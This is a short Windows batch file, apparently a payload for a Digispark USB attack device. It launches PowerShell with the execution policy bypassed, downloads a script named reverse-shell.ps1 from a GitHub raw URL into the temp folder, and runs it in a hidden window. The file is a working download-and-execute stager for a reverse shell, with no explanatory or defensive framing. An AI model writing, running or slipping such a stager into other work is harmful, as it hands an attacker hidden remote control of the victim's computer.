@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/leightonisrael/digispark-play/main/reverse-shell.ps1' -OutFile '%temp%\reverse_shell.ps1'; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File %temp%\reverse_shell.ps1' -WindowStyle Hidden"
